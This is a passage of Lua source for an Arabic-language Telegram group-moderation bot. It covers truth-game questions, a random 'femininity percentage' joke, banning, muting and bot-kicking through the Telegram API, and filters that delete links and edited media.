"صراحه  |  تصلي صلواتك الخمس كلها؟",
"صراحه  |  ‏تجامل أحد على راحتك؟",
"صراحه  |  اشجع شيء سويتة بحياتك؟",
"صراحه  |  وش ناوي تسوي اليوم؟",
"صراحه  |  وش شعورك لما تشوف المطر؟",
"صراحه  |  غيرتك هاديه ولا تسوي مشاكل؟",
"صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  اي الدول تتمنى ان تزورها؟",
"صراحه  |  متى اخر مره بكيت؟",
"صراحه  |  تقيم حظك ؟ من عشره؟",
"صراحه  |  هل تعتقد ان حظك سيئ؟",
"صراحه  |  شـخــص تتمنــي الإنتقــام منـــه؟",
"صراحه  |  كلمة تود سماعها كل يوم؟",
"صراحه  |  **هل تُتقن عملك أم تشعر بالممل؟",
"صراحه  |  هل قمت بانتحال أحد الشخصيات لتكذب على من حولك؟",
"صراحه  |  متى آخر مرة قمت بعمل مُشكلة كبيرة وتسببت في خسائر؟",
"صراحه  |  ما هو اسوأ خبر سمعته بحياتك؟",
"‏صراحه  | هل جرحت شخص تحبه من قبل ؟",
"صراحه  |  ما هي العادة التي تُحب أن تبتعد عنها؟",
"‏صراحه  | هل تحب عائلتك ام تكرههم؟",
"‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الكريم – صلى الله عليه وسلم؟",
"‏صراحه  |  هل خجلت من نفسك من قبل؟",
"‏صراحه  |  ما هو ا الحلم  الذي لم تستطيع ان تحققه؟",
"‏صراحه  |  ما هو الشخص الذي تحلم به كل ليلة؟",
"‏صراحه  |  هل تعرضت إلى موقف مُحرج جعلك تكره صاحبهُ؟",
"‏صراحه  |  هل قمت بالبكاء أمام من تُحب؟",
"‏صراحه  |  ماذا تختار حبيبك أم صديقك؟",
"‏صراحه  | هل حياتك سعيدة أم حزينة؟",
"صراحه  |  ما هي أجمل سنة عشتها بحياتك؟",
"‏صراحه  |  ما هو عمرك الحقيقي؟",
"‏صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  ما هي أمنياتك المُستقبلية؟‏",
"صراحه  | هل قبلت فتاه؟"
}
send(msg.chat_id_, msg.id_,'['..LEADER_Msg[math.random(#LEADER_Msg)]..']') 
return false
end
end
if text and text ~="صراحه" and database:get(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_) == "sendrkkoe" then
numj = {"اي الكدب دا 😒","فعلا بتتكلم صح🤗","يجدع قول كلام غير دا😹","حصل اوماال😹💔","طب عيني ف عينك كدا 👀","انت صح🙂♥",};
sendnuj = numj[math.random(#numj)]
xl = ' ◉ '..text..' ◉  \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_)
end
if text == "نسبه الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه انوثتها \n مثال روان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه الانوثه '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
DRAGON = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(DRAGON)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
DRAGON = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(DRAGON)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
SourceDRAGON(data.message_,data)
plugin_Dragon(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ◉ شخص ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد ادمن"
end
send(msg.chat_id_,0,''..t..'\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ تم التعديل على الميديا\n ◉ الشخص الي قام بالتعديل\n ◉ ايدي الشخص ◂ '..result.sender_user_id_..'\n ◉ معرف الشخص←{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------

------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
local DRAGONAbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
if DRAGONAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ◉ ["..DRAGONAbot.."] \n") 
else
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/so_alfaa  )}\n ◉ ["..DRAGONAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
if DRAGON1_Msg then    
send(msg.chat_id_, msg.id_," ◉ "..DRAGON1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------

elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


end -- end new msg dev.mr sofi 
end -- end callback dev.mr sofi